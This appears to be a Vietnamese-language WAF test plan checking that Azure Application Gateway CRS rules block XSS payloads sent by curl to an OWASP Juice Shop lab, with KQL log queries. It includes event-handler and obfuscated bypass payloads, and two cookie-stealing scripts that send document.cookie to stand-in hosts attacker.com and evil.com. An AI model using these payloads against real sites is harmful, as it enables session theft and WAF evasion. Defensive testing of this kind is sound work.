# 11 - XSS Test

## TC-XSS: Cross-Site Scripting Attack Testing

---

## Tổng quan

| Thuộc tính | Chi tiết |
|-----------|---------|
| **Objective** | Xác minh WAF phát hiện và chặn XSS attacks |
| **Target** | OWASP Juice Shop qua Application Gateway WAF v2 |
| **Tool** | curl, Browser, Burp Suite |
| **WAF Rules** | CRS 941xxx (XSS) |
| **Expected Result** | HTTP 403 Forbidden cho mọi XSS payload |

---

## TC-XSS-01: Reflected XSS — Script Tag

### Thông tin

| Field | Value |
|-------|-------|
| **Test ID** | TC-XSS-01 |
| **Priority** | Critical |
| **CRS Rule** | 941100, 941110 |
| **Endpoint** | `GET /rest/products/search` |

### Payload

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>document.location='http://attacker.com/?c='+document.cookie</script>
```

### Test Steps

```bash
export TARGET="http://40.x.x.x"

# Test 1: Basic script tag
curl -v -G \
  --data-urlencode "q=<script>alert(1)</script>" \
  $TARGET/rest/products/search \
  2>&1 | tee tc_xss_01_result.txt

# Test 2: Cookie stealing payload
curl -v -G \
  --data-urlencode "q=<script>document.location='http://evil.com/?c='+document.cookie</script>" \
  $TARGET/rest/products/search \
  2>&1

# Test qua browser (copy URL vào browser)
echo "URL: $TARGET/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

### Expected Result

```
HTTP/1.1 403 Forbidden
WAF Rule: 941100 — XSS Attack Detected via libinjection
         941110 — XSS Filter - Category 1: Script Tag Vector
```

### WAF Log Evidence

```kusto
AzureDiagnostics
| where Category == "ApplicationGatewayFirewallLog"
| where ruleId_s startswith "941"
| where action_s == "Blocked"
| project TimeGenerated, clientIp_s, requestUri_s, ruleId_s, Message
| order by TimeGenerated desc
| take 10
```

---

## TC-XSS-02: XSS qua IMG Tag — onerror Handler

### Thông tin

| Field | Value |
|-------|-------|
| **Test ID** | TC-XSS-02 |
| **Priority** | Critical |
| **CRS Rule** | 941120, 941150 |

### Payload

```html
<img src=x onerror=alert(1)>
<img src="invalid" onerror="alert(document.domain)">
<img src=1 href=1 onerror="javascript:alert(1)">
```

### Test Steps

```bash
# Test img onerror XSS
curl -v -G \
  --data-urlencode "q=<img src=x onerror=alert(1)>" \
  $TARGET/rest/products/search \
  2>&1 | tee tc_xss_02_result.txt

# Test với attribute injection
curl -v -G \
  --data-urlencode "q=<img src=invalid onerror=alert(document.domain)>" \
  $TARGET/rest/products/search \
  2>&1

# Test XSS in URL parameter với Burp Suite
# 1. Mở Burp Suite → Proxy → Intercept ON
# 2. Truy cập URL trong browser
# 3. Intercept request
# 4. Sửa parameter q thành payload
# 5. Forward request
# 6. Chụp response 403
```

### Expected Result

```
HTTP/1.1 403 Forbidden
WAF Rule: 941120 — XSS Filter - Category 2: Event Handler Vector
```

---

## TC-XSS-03: XSS — Event Handler Injection

### Thông tin

| Field | Value |
|-------|-------|
| **Test ID** | TC-XSS-03 |
| **Priority** | High |
| **CRS Rule** | 941120, 941130 |

### Payload

```html
<div onmouseover="alert(1)">hover me</div>
<body onload=alert(1)>
<input type="text" onfocus="alert(1)" autofocus>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Test Steps

```bash
# Test event handler payloads
for PAYLOAD in \
  '<div onmouseover=alert(1)>' \
  '<body onload=alert(1)>' \
  '<svg onload=alert(1)>' \
  '<details open ontoggle=alert(1)>'; do
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -G \
    --data-urlencode "q=$PAYLOAD" \
    $TARGET/rest/products/search)
  
  echo "Payload: $PAYLOAD → HTTP $STATUS"
done
```

**Expected Output:**
```
Payload: <div onmouseover=alert(1)> → HTTP 403
Payload: <body onload=alert(1)> → HTTP 403
Payload: <svg onload=alert(1)> → HTTP 403
Payload: <details open ontoggle=alert(1)> → HTTP 403
```

---

## TC-XSS-04: XSS — JavaScript URI

### Thông tin

| Field | Value |
|-------|-------|
| **Test ID** | TC-XSS-04 |
| **Priority** | High |
| **CRS Rule** | 941140 |

### Payload

```html
<a href="javascript:alert(1)">click me</a>
javascript:alert(document.cookie)
<iframe src="javascript:alert(1)">
```

### Test Steps

```bash
# Test JavaScript URI
curl -v -G \
  --data-urlencode "q=<a href=javascript:alert(1)>click</a>" \
  $TARGET/rest/products/search \
  2>&1 | tee tc_xss_04_result.txt

# Test XSS in search với URL encode
curl -v "$TARGET/#/search?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Etest%3C%2Fa%3E" \
  2>&1

# Test JavaScript URI trực tiếp
curl -v -G \
  --data-urlencode "q=javascript:alert(document.cookie)" \
  $TARGET/rest/products/search \
  2>&1
```

---

## TC-XSS-05: XSS Bypass Attempts

### Thông tin

| Field | Value |
|-------|-------|
| **Test ID** | TC-XSS-05 |
| **Priority** | Medium |
| **CRS Rule** | 941100 |

### Payload (Obfuscated)

```html
<!-- Case variation -->
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoded -->
<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>

<!-- No quotes -->
<img src=x onerror=alert(1) />

<!-- Newline insertion -->
<scr
ipt>alert(1)</scr
ipt>
```

### Test Steps

```bash
# Test case variation
curl -v -G \
  --data-urlencode "q=<SCRIPT>alert(1)</SCRIPT>" \
  $TARGET/rest/products/search \
  2>&1

# Test HTML entity encoded
curl -v -G \
  --data-urlencode "q=<script>&#97;&#108;&#101;&#114;&#116;(1)</script>" \
  $TARGET/rest/products/search \
  2>&1
```

> **Ghi chú:** Azure WAF CRS 3.2 normalize HTML entities, case-fold input trước khi match rules → các bypass này thường không hiệu quả.

---

## Tổng kết XSS Tests

### Bảng Kết quả

| TC ID | Payload Type | HTTP Status | WAF Rule | Status |
|-------|-------------|------------|---------|--------|
| TC-XSS-01 | `<script>alert(1)</script>` | *(điền)* | 941100 | ⬜ |
| TC-XSS-02 | `<img onerror=alert(1)>` | *(điền)* | 941120 | ⬜ |
| TC-XSS-03 | `<div onmouseover=alert(1)>` | *(điền)* | 941120 | ⬜ |
| TC-XSS-04 | `javascript:alert(1)` | *(điền)* | 941140 | ⬜ |
| TC-XSS-05 | Case variation bypass | *(điền)* | 941100 | ⬜ |

### KQL Query — XSS Summary

```kusto
AzureDiagnostics
| where Category == "ApplicationGatewayFirewallLog"
| where ruleId_s startswith "941"
| where action_s == "Blocked"
| summarize XSSBlocked = count() by ruleId_s, Message
| order by XSSBlocked desc
```

---

*Tài liệu tiếp theo: [12-path-traversal-test.md](12-path-traversal-test.md)*
